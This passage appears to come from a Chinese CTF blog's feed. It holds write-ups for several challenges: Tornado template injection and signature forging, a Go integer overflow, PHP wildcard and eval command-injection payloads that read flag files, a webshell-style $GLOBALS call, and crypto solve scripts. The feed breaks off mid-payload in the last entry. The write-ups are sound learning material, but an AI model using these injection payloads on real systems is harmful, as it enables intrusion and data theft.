L^R^k0^k1^k3^k5^k6</span><br></pre></td></tr></table></figure></p><p>根据异或运算得特性<br>已知test(也就是L，R),fez(test,k)(也就是f,g)，即可通过test与fez(test,k) 进行异或运算可得出 <code>k0^k1^k3^k5^k6</code> ，<code>k1^k2^k4^k5</code><br>从而还原flag<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(a)==len(b)</span><br><span class="line">    c=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        c+=chr(ord(a[i])^ord(b[i]))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"> </span><br><span class="line">test = <span class="string">'50543fc0bca1bb4f21300f0074990f846a8009febded0b2198324c1b31d2e2563c908dcabbc461f194e70527e03a807e9a478f9a56f7'</span></span><br><span class="line">test = binascii.a2b_hex(test)</span><br><span class="line">test_k = <span class="string">'66bbd551d9847c1a10755987b43f8b214ee9c6ec2949eef01321b0bc42cffce6bdbd604924e5cbd99b7c56cf461561186921087fa1e9'</span></span><br><span class="line">test_k = binascii.a2b_hex(test_k)</span><br><span class="line">m_k = <span class="string">'44fc6f82bdd0dff9aca3e0e82cbb9d6683516524c245494b89c272a83d2b88452ec0bfa0a73ffb42e304fe3748896111b9bdf4171903'</span></span><br><span class="line">m_k = binascii.a2b_hex(m_k)</span><br><span class="line"> </span><br><span class="line">l = test[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">r = test[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line">l1 = test_k[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">r1 = test_k[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line">l2 = m_k[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">r2 = m_k[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line"> </span><br><span class="line">c = xor(xor(l,r),r1)</span><br><span class="line">Lr = xor(c,r2)</span><br><span class="line">d = xor(r,l1)</span><br><span class="line">R = xor(d,l2)</span><br><span class="line">L = xor(Lr,R)</span><br><span class="line">m = L+R  </span><br><span class="line"><span class="keyword">print</span> m</span><br></pre></td></tr></table></figure></p><p><a href="https://imgchr.com/i/iUP9cn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/13/iUP9cn.md.png" alt="iUP9cn.md.png"></a></p><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><p>这里的web题目是我趁着题目还没关的时候赶紧复现的（不会做后面弄懂也是学习的方法呀23333），感谢一叶飘零学长的帮助哇。。。。</p><h4 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy tornado"></a>easy tornado</h4><p>这个题目上来每个选项url就很可疑<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.95.5:31792/file?filename=Orz.txt&amp;signature=d227ce6c7cea5a9cd7f1721e0baace7d</span><br><span class="line"></span><br><span class="line">Orz.txt</span><br><span class="line">render() </span><br><span class="line"></span><br><span class="line">http://49.4.95.5:31792/file?filename=hint.txt&amp;signature=c7b8660e245f1360c378db1074a2a4c7</span><br><span class="line"></span><br><span class="line">hint.txt</span><br><span class="line">md5(cookie_secret + md5(filename)) </span><br><span class="line"></span><br><span class="line">http://49.4.95.5:31792/file?filename=flag.txt&amp;signature=d24b2dc1952a495057af1a898c55931b</span><br><span class="line"></span><br><span class="line">flag.txt</span><br><span class="line">/fllllllllllag</span><br></pre></td></tr></table></figure></p><p>很明显是去读文件<code>/fllllllllllag</code> ，并且要带上签名，一开始我做这个题的时候还以为强行爆破一波secret。。。还一度认为是Hash长度拓展攻击。。。。尴尬</p><p>关键点在于<code>cookie_secret</code></p><p>当我们随便输入东西的时候会出现一个报错页面<br><a href="https://imgchr.com/i/iUPn39" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/14/iUPn39.md.png" alt="iUPn39.md.png"></a></p><p>这个页面过滤了很多东西，并且返回Orz</p><p>输入</p><p><code>http://49.4.95.5:31792/error?msg=</code></p><p><a href="https://imgchr.com/i/iUPucR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/14/iUPucR.md.png" alt="iUPucR.md.png"></a></p><p>这里的话飘零大佬说可以进行模板注入，并且只能读一个变量<br>接下来的思路才是骚，直接阅读tornado的源码<br><code>https://github.com/tornadoweb/tornado/blob/master/tornado/auth.py</code></p><p>在<code>handler.settings</code> 里面存在<code>cookie_secret</code>这东西</p><p>读取一下</p><p><code>http://49.4.95.5:31792/error?msg=</code></p><p>注意一下，这里的两个大括号{}是起到渲染模板的作用。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Whoops, looks like somethings went wrong . </span><br><span class="line">&#123;&apos;login_url&apos;: &apos;/login&apos;, &apos;template_path&apos;: &apos;templates&apos;, &apos;xsrf_cookies&apos;: True, &apos;cookie_secret&apos;: &apos;B3&#125;r8at^62-?kGW&lt;!YJ&#123;Kl]zEZep@Nd)$H%*~9fh15.s[&gt;&amp;T+(7P4uQ0UVXDOiFb&apos;, &apos;debug&apos;: False, &apos;file_path&apos;: &apos;/www/static/files&apos;, &apos;static_path&apos;: &apos;static&apos;&#125;</span><br></pre></td></tr></table></figure><p>可以把里面的内容给读出来，以后还是得对python的MVC架构学习一下才行。。</p><p>立即构造签名<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> md5(<span class="string">'B3&#125;r8at^62-?kGW&lt;!YJ&#123;Kl]zEZep@Nd)$H%*~9fh15.s[&gt;&amp;T+(7P4uQ0UVXDOiFb'</span>.md5(<span class="string">'/fllllllllllag'</span>)) ;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><code>http://49.4.95.5:31792/file?filename=/fllllllllllag&amp;signature=3e9f949b7c37c999287eb096f576be00</code></p><p>得到flag<br><a href="https://imgchr.com/i/iUPKj1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/14/iUPKj1.md.png" alt="iUPKj1.md.png"></a></p><h4 id="ltshop"><a href="#ltshop" class="headerlink" title="ltshop"></a>ltshop</h4><p>这个题目一开始我一直以为是前端的<code>ajax</code>的操作问题，直到看了飘零大哥的wp才知道有两种思路，一种是条件竞争，但条件竞争好像还是有上限的，开个多线程跑一下，这也是为了后面的怪异的<code>9999999</code>做铺垫,因为你没有5个以上的大辣条是换不了辣条之王的。<br><img src="https://s1.ax1x.com/2018/10/14/iUP1HK.png" alt="iUP1HK.png"><br>然后就会发现辣条数目几变成7个<br><img src="https://s1.ax1x.com/2018/10/14/iUP8AO.png" alt="iUP8AO.png"></p><p>下面才是重点，因为这里是用的是Go语言，很可能存在整数溢出，可以参考一下这篇文章<br><a href="http://www.it1352.com/808569.html" target="_blank" rel="noopener">http://www.it1352.com/808569.html</a></p><p>go语言整数溢出为<code>18446744073709551615</code>，然后可以计算<code>number=(18446744073709551615/5)+1=3689348814741910324</code>，然后我们可以直接溢出获得flag<br>下面这篇博客对于溢出过大有更深的理解:<br><a href="https://qingchenldl.github.io/2018/10/13/护网杯WP-BitPwn/?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://qingchenldl.github.io/2018/10/13/护网杯WP-BitPwn/?tdsourcetag=s_pctim_aiomsg</a></p><p><a href="https://imgchr.com/i/iUPGND" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/14/iUPGND.md.png" alt="iUPGND.md.png"></a></p><p>还有一道题目是关于Laravel框架的解题过程，也是秀，知识点也很多，建议去看看一叶飘零学长的博客啦。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>这比赛又学到了不少的东西，果然python开发出来的web框架还是自己的弱项，条件竞争这东西看来现在比赛都很流行呢，可惜自己对这方面的做题敏感度不够，以前一直认为这只有安恒的月赛才会出，以后还是得接触pwn了，继续努力。。。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;护网杯的这次比赛还是很有收获的，至少在web方面我认为是这样
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CUMT平台的部分题解</title>
    <link href="0verwatch.top/2018/09/30/CUMT-CTF-Platform/"/>
    <id>0verwatch.top/2018/09/30/CUMT-CTF-Platform/</id>
    <published>2018-09-30T06:59:37.000Z</published>
    <updated>2018-10-09T07:23:35.986Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">请输入密码</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      实验课结束后发布
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>安恒9月部分赛题复现</title>
    <link href="0verwatch.top/2018/09/30/anheng-9month/"/>
    <id>0verwatch.top/2018/09/30/anheng-9month/</id>
    <published>2018-09-30T05:41:02.000Z</published>
    <updated>2018-10-04T09:51:57.259Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>To be patient…</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>赶紧趁着电脑的屏幕修好了，刚好安恒的web题目有复现，赶紧做。。。。。又从这几个题目里面学习到新知识了<a id="more"></a>小结一下</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="babybypass"><a href="#babybypass" class="headerlink" title="babybypass"></a>babybypass</h4><p>这个题目我记得我当初做的时候是一直考虑着用<code>$</code>以及<code>_</code>去绕过这些数字字母之类的东西，突然发现他这个题目里面把那个<code>$</code>以及<code>_</code>也经过了过滤，这样的话就少了很多可能性，而且这题比原题的限制长度小了，更有难度。现在就开始总结一下从这个题目学到的知识点<br>1.php短标签输出，这个知识点很久之前就已经见过。<br><code>&lt;?=?&gt;</code>这个就是短标签，相当于<code>&lt;?php echo …;?&gt;</code>一般在php的配置文件<code>php.ini</code>中有一个<code>short_open_tag</code>的值，开启以后可以使用PHP的短标签：<code>&lt;? ?&gt;</code>，但是在现实开发中一般不推崇这种做法。。<br>但这个题目就很巧妙用了这个东西<br>2.第二个就是关于php函数eval函数的一些东西，这里的php执行函数是eval，在php官方手册上面有这样一句话，这是一个坑了，要想执行代码的话，我们就需要先用<code>?&gt;</code>去闭合，把上一段代码就给结束离开 ，然后我们才可以利用<code>&lt;?=?&gt;</code>去输出<br><a href="https://imgchr.com/i/ilI9II" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilI9II.md.png" alt="ilI9II.md.png"></a></p><p>区别一下有些系统执行函数比如system(有回显)，exec(没回显)，以及反引号这类的，这是直接执行系统函数的，一会我们也会用到<br><img src="https://s1.ax1x.com/2018/09/30/ilIPit.png" alt="ilIPit.png"><br><img src="https://s1.ax1x.com/2018/09/30/ilIiJP.png" alt="ilIiJP.png"></p><p>3.Linux通配符的作用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*        代表『 0 个或无穷多个』任意字符</span><br><span class="line">?        代表『一定有一个』任意字符</span><br></pre></td></tr></table></figure></p><p>4.Linux 下面一切皆文件<br>就是说我们平常一般在下面Linux下面的输入的命令，都可以通过文件去同样的执行，这对我来说是新知识。。。。。<br><img src="https://s1.ax1x.com/2018/09/30/ilIMiq.png" alt="ilIMiq.png"></p><p>然后我们就可以去实现payload，这个题目是Apache搭的，我们可以去默认目录先查看一波文件，一般来说默认目录在<code>/var/www/html</code></p><p>构造<code>code=?&gt;&lt;?=`/???/??? /???/???/????/*`;?&gt;</code>相当于<code>code=?&gt;&lt;?=` /bin/cat /var/www/html/*`;?&gt;</code></p><p>然后会发现php代码里面的源代码getflag那一部分的函数是是从/flag里面读取的。。。。听说这题的getflag函数也是个坑。。好像不能直接从url里面调用</p><p>所以再来构造一下<br><code>code=?&gt;&lt;?=`/???/??? /????`;?&gt;</code>相当于<code>code=?&gt;&lt;?=` /bin/cat /flag`;?&gt;</code>得到flag<br><a href="https://imgchr.com/i/ilIQJ0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIQJ0.md.png" alt="ilIQJ0.md.png"></a></p><h4 id="神奇的CMS"><a href="#神奇的CMS" class="headerlink" title="神奇的CMS"></a>神奇的CMS</h4><p>进入网站发现有用户登录，然后测试发现弱密码<br><code>admin admin123</code></p><p>然后点击几个模块发现有两个模块有点奇怪<br><a href="https://imgchr.com/i/ilIlWV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIlWV.md.png" alt="ilIlWV.md.png"></a></p><p>这两个模块一个模块有提示，另一个模块存在输入并且存在回显<br>先看提示，一是让你下载源码包，另外是提示flag在哪，先把源码包下载下来，源码里面有两个控制器，一个是<code>content</code>，另一个是<code>site</code></p><p>发现是Yii框架的东西，幸亏我还是做过Yii框架的开发的，对此还是有点小熟悉。。。</p><p>这里看回放的时候还是学到点东西的，就是我们在代码审计的时候一般要找有输入有输出的地方，这里很可能就存在这漏洞，这就相当于在脑里面建了一个模型，但是想想也很正常，平常我们学编程的时候也没过多的去考虑编程的输入输出，比如我们在一开始用C编程的时候你会忘掉除数不为0的前提吗？所以说我们更多的是考虑代码的核心功能能否实现。</p><p>所以在<code>ADD_IMG</code>(因为有输入有回显)页面里面就很有可能存在漏洞了，所以我们得专注代码里面描述这一段东西的内容</p><p> Yii框架讲究的是MVC架构，一般代码审计的话得先找<code>Controller</code>里面的东西毕竟都是些逻辑性的东西，关键的功能也在里面<br>所以在这个url里面的site是指的控制器，而backup就是site控制器里面的操作<br><img src="https://s1.ax1x.com/2018/09/30/ilI8QU.png" alt="ilI8QU.png"><br>我以前的博客讲过<br><a href="https://imgchr.com/i/ilIdF1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIdF1.md.png" alt="ilIdF1.md.png"></a></p><p>从代码里面你会发现<code>site</code>控制器里面都是些展示页面以及登陆的功能，但是不要过分以为登录里面会有sql注入，毕竟Yii框架里面是可以通过对login函数设置<code>rules</code>再来通过<code>validate</code>去检测是否出现SQL注入，所以出现sql注入机率不大</p><p>但是在回放里面学到了一种更骚气的代码调试的方法。。就是当你不懂框架的时候如何将其变成普通的php代码进行调试<br>这个方法就是将跟框架有关的东西去掉把关于框架的类看成一个普通的类，再把跟业务逻辑以及数据库相关操作的功能有关的去掉，然后新建那个类，单纯测试一下那个输入输出的函数就好</p><p>尝试调试，我这里用的phpstorm去调试，在<code>parstIf</code>函数下了断点，发现执行到下图所示的地方就会重新返回到echo输出语句中<br><a href="https://imgchr.com/i/ilIrQO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIrQO.md.png" alt="ilIrQO.md.png"></a><br>说明要在字符串里面加上<code>{if</code>此类的字符串<br>随便找一个地方加加，为的是能够进入else的循环<br><a href="https://imgchr.com/i/ilIbwj" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIbwj.md.png" alt="ilIbwj.md.png"></a><br>进入else会发现到<code>buildregx</code>又会有一个新的函数，其实这个函数就是为了构建一个正则表达式，在字符串前后添加<code>/</code>，可以从debug的结果看得出来<br><a href="https://imgchr.com/i/ilIqTs" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIqTs.md.png" alt="ilIqTs.md.png"></a><br>这时候我们就需要匹配<code>/{if:(.*?)}(.*?){end if}/is</code>这样的正则，但是之前的输入会导致其跳出该循环，从而又直接返回了结果，不能进入到for循环里面执行eval函数<br><a href="https://imgchr.com/i/ilIXYq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIXYq.md.png" alt="ilIXYq.md.png"></a><br>这时候就又需要构建对应的东西了，我们把正则里面的<code>(.*?)</code>改为自己随意的内容就好<br><a href="https://imgchr.com/i/ilIjf0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIjf0.md.png" alt="ilIjf0.md.png"></a><br>然后再追踪一次变化过程，经过<code>preg_match_all</code>这个函数的时候我们就可以看到这个函数会把原来的匹配的字符分成三段，首先是<code>iar[0][0]</code>是匹配到的字符串<code>{if:2333}23333{end if}</code>，然后是分别是第一个任意内容以及第二个任意内容匹正则配到的字符串，<code>iar[1][0]=2333,iar[2][0]=23333</code></p><p>继续走的话，这时候就可以进行一次循环了，因为现在arlen=1,然后我们就可以继续执行下去了，后买的事情就很简单了，先是判断<code>iar[1][0]</code>以及<code>iar[2][0]</code>里面是否有等号，再判断一下<code>iar[2][0]</code>里面是否有<code>{elseif</code>以及<code>else</code>，这几个判断都不影响<br><a href="https://imgchr.com/i/ilopXF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilopXF.md.png" alt="ilopXF.md.png"></a><br>最后还是将<code>iar[1][0]</code>放在这个eval语句里面执行<br><a href="https://imgchr.com/i/iloCm4" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/iloCm4.md.png" alt="iloCm4.md.png"></a><br>梳理一下逻辑也就是说检查最少的是<code>iar[1][0]</code>，只检查他是否存在<code>=</code>，那就好办了，在eval语句中我们只需要对<code>iar[1][0</code>]闭合一下语句我们就可以执行我们想要的命令即可</p><p>Payload<br><code>{if:1)print_r(`cat /tmp/flag`);die();//}123{end if}</code>第一种思路直接在里面拼接命令执行语句即可<br><img src="https://s1.ax1x.com/2018/09/30/iloi79.png" alt="iloi79.png"></p><p>第二种思路就是在没有过滤<code>$GOLBALS</code>全局变量的前提下使用拼接，但个人感觉这东西会在PHP开发中给禁掉吧毕竟可能会对代码里面的其他变量造成影响，这个套路一般都是用来写过waf的小马用的</p><p><code>{if:1)$GLOBALS[&#39;_G&#39;.&#39;ET&#39;][a]($GLOBALS[&#39;_G&#39;.&#39;ET&#39;][b]);die();//}{end if}</code></p><p>尝试这个的是时候还以为服务器坏了。。。突然发现<code>processing request</code>。。。应该是没传参，传参了就好了</p><p><a href="https://imgchr.com/i/iloAt1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/iloAt1.md.png" alt="iloAt1.md.png"></a></p><p><a href="https://imgchr.com/i/iloM0H" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/iloM0H.md.png" alt="iloM0H.md.png"></a><br><a href="https://imgchr.com/i/iloQ7d" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/iloQ7d.md.png" alt="iloQ7d.md.png"></a></p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="简单加密"><a href="#简单加密" class="headerlink" title="简单加密"></a>简单加密</h4><p>这个题目帮我复习了一下信息安全数学基础第一章的内容，所以我就记录一下这个题目，其他题目就不写了</p><p>这个关键点就是作取余运算的时候结果是不会超过余数的，如果有打过ACM的人就会知道有一个叫快速幂的东西跟这个也差不多，极大地降低了代码所需要的空间度，使得数不会越界</p><p>观察主函数现在我们需要的就是<code>passwd</code>这个参数，但是从<code>generate_passwd</code>是得到最多<code>passwd</code>不会超过<code>0xB18E</code>，所以我们就可以选择爆破<br><a href="https://imgchr.com/i/ilo3tI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilo3tI.md.png" alt="ilo3tI.md.png"></a></p><p>跑一下脚本就可以得到flag<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*- </span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(data, password)</span>:</span></span><br><span class="line">    bs = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + (bs - len(s) % bs) * chr(bs - len(s) % bs)</span><br><span class="line">    iv = <span class="string">"0102030405060708"</span></span><br><span class="line">    cipher = AES.new(password, AES.MODE_CBC, iv)</span><br><span class="line">    data = cipher.encrypt(pad(data))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(data, password)</span>:</span></span><br><span class="line">    unpad = <span class="keyword">lambda</span> s : s[<span class="number">0</span>:-ord(s[<span class="number">-1</span>])]</span><br><span class="line">    iv = <span class="string">"0102030405060708"</span></span><br><span class="line">    cipher = AES.new(password, AES.MODE_CBC, iv)</span><br><span class="line">    data  = cipher.decrypt(data)</span><br><span class="line">    <span class="keyword">return</span> unpad(data)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_passwd</span><span class="params">(key,result)</span>:</span></span><br><span class="line">    data_halt = <span class="string">"LvR7GrlG0A4WIMBrUwTFoA=="</span>.decode(<span class="string">"base64"</span>)</span><br><span class="line">    rand_int =  int(decrypt(data_halt, key).encode(<span class="string">"hex"</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="comment">#round = 0x7DC59612</span></span><br><span class="line">    result = result * (rand_int % <span class="number">0xB18E</span>) % <span class="number">0xB18E</span></span><br><span class="line">    <span class="keyword">return</span> encrypt(str(result), key)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    key = <span class="string">'17abeca4cc4c432a52c2b7f6d24d1888'</span></span><br><span class="line">    </span><br><span class="line">    output = <span class="string">"u6WHK2bnAsvTP/lPagu7c/K3la0mrveKrXryBPF/LKFE2HYgRNLGzr1J1yObUapw"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> range(<span class="number">0xB18E</span>):</span><br><span class="line">        passwd = generate_passwd(key.decode(<span class="string">"hex"</span>),result)</span><br><span class="line">        r = decrypt(output.decode(<span class="string">"base64"</span>), passwd)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> r:</span><br><span class="line">            <span class="keyword">print</span> r</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;To be patient…&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;赶紧趁着电脑的屏幕修好了，刚好安恒的web题目有复现，赶紧做。。。。。又从这几个题目里面学习到新知识了
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
      <category term="Crypto" scheme="0verwatch.top/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>Hitcon2017 babyfirst-revenge v2复现</title>
    <link href="0verwatch.top/2018/09/18/hitcon2017-babyfirstv2/"/>
    <id>0verwatch.top/2018/09/18/hitcon2017-babyfirstv2/</id>
    <published>2018-09-18T14:36:10.000Z</published>
    <updated>2018-09-18T14:39:35.907Z</updated>
    
    <content type="html"><![CDATA[<p>这个题目的条件更加苛刻了，先放个源码<a id="more"></a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure></p><p>简单看一下这段代码比上一次的代码的cmd长度更小，很显然我们就不能再以<code>ls&gt;&gt;_</code> 来将相关的命令覆盖到文件里面了<br>但是orange大大用的方法真是叹为观止，根据官方payload一步步来分析这里是怎么巧妙的绕过4个字符串的长度的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">payload = [ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate "g&gt; ht- sl" to file "v"</span></span><br><span class="line"> <span class="string">'&gt;dir'</span>, </span><br><span class="line"><span class="string">'&gt;sl'</span>,</span><br><span class="line"> <span class="string">'&gt;g\&gt;'</span>,</span><br><span class="line"> <span class="string">'&gt;ht-'</span>,</span><br><span class="line"> <span class="string">'*&gt;v'</span>,</span><br><span class="line"> </span><br><span class="line"></span><br><span 